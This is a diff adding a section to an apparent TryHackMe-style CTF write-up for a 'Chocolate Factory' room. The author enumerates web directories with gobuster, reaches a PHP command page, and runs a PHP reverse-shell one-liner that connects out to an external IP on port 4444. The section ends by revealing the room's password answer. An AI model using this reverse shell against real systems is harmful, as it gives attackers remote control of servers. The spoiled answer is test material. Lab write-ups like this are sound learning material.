@@ -61,8 +61,66 @@ Well what happens if I extract the file.
 
 And there is the answer. Submitting it shows it is correct.
 
+### Charlie's Password
 
-### To be continued...
+Well if you thought that was it well, you'd be WRONG, that was just the start lol.
+
+I think this might be easier as this is just asking for a password.
+
+![The question btw](https://litter.catbox.moe/1ds4r26y3wr2yeit.png)
+
+Okay, I know there is a http service, could there be any more directories on the server.
+I will use Go boster to find out exactly that
+
+gobuster dir -u http://10.10.8.21/ -w /usr/share/dirb/wordlists/common.txt -x php,html,js,txt
+
+And this was the result 
+
+![yes i did steal this image](https://cryptichacker.github.io/assets/img/tryhackme/chocolatefactory/3.png)
+
+Yes, yes I did just steal this image from another write-up 😭
+
+![whyyyyyyy](https://cdn.discordapp.com/attachments/1084461361393836162/1408023721733521499/image0.gif?ex=68ac3047&is=68aadec7&hm=8599790a97e30b9721ac498766c3301dfedd4a11c6f0f7e033b327b8b0fdbf3a&)
+
+I will go to home.php as shown in the (stolen) screenshot I showed.
+
+![idk figure it out](https://litter.catbox.moe/ulorcm72yz628eyo.png)
+
+Ohhhhhhhh this is great progress. A literal command prompt, what more could I possibly ask.
+
+I will try running: whoami
+
+![well idk what this is](https://litter.catbox.moe/fh6ugf4y7plv2b9f.png)
+
+Ok am puzzled at this. I was expecting the username to be something like Charlie. Maybe this is a seperate user environment.
+
+Wait what is this a php payload: php -r '$sock=fsockopen("18.202.129.195",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+
+Let's run it!
+
+![It is loading smth?](https://litter.catbox.moe/tinuabqig3o9lpl9.png)
+
+Something is loading?
+
+Let's check netcat now
+
+update: I am using a macOS machine so unfortunatly I can't show you my results. I will link the images from another write-up and I will have a link below. If you find a solution feel free to send me a message on Discord, @noah_deyck or email me at brevity.slicer9f@icloud.com
+
+Let's also run Netcat to scan the payload response. 
+
+![Source: CrypticHacker](https://cryptichacker.github.io/assets/img/tryhackme/chocolatefactory/5.png)
+
+and using the shell i found validate.php. Let's open it
+
+![Source: CrypticHacker](https://cryptichacker.github.io/assets/img/tryhackme/chocolatefactory/8.png)
+
+And there is the password, cn7824.
+
+### To be continued
+
+
+
+
 
 
 
